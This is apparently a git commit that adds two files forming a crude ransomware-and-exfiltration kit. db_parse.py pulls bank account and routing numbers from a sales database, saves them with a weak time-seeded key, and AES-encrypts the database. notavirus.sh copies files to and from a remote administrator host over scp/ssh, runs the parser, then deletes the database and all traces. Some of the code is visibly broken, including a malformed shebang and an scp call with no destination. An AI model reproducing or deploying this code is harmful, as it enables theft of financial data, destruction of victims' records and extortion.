e0b37ba4097c417b4f66f2774d1b0d9f1374e52b
Maya <77994029+mayasavino@users.noreply.github.com>
2023-12-04 16:09:20 -0700

    Add files via upload

---
+++ db_parse.py
@@ -0,0 +1,30 @@
+import sqlite3
+import random
+import time
+import pyAesCrypt
+
+conn = sqlite3.connect('paintsales.db')
+cursor = conn.cursor()
+
+# get info
+cursor.execute('SELECT account_no FROM orders')
+account_nos = cursor.fetchall()
+cursor.execute('SELECT routing_no FROM orders')
+routing_nos = cursor.fetchall()
+
+# create encryption key
+random.seed(time.time())
+key = random.randint(200000000000000000000000000000000000000, 300000000000000000000000000000000000000)
+
+# save important info to separate file
+with open('account_info.txt', 'w') as f:
+    for i,j in enumerate(account_nos):
+        f.write(f'account: {j}    routing: {routing_nos[i]}\n')
+    f.write(f'\nkey: {key}')
+
+# encrypt the remaining data
+pyAesCrypt.encryptFile('paintsales.db', 'paintsales.db.aes', str(key))
+
+# commit and close connection
+conn.commit()
+conn.close()
---
+++ notavirus.sh
@@ -0,0 +1,21 @@
+!# /usr/bin/bash
+
+scp present.zip administrator@12.34.56.70:C:\Users\Jerry\Downloads
+ssh administrator@12.34.56.70
+
+for a in $(ls *.db)
+do
+    echo Selecting $a
+    echo Executing ...
+    python3 db_parse.py
+    echo Done.
+    echo Copying info back ...
+    scp account_info.txt
+    echo Done.
+    echo Cleaning up ...
+    rm -f $a
+    rm -f account_info.txt
+    rm -f db_parse.py
+    rm -f notavirus.sh
+    echo Finished.
+done
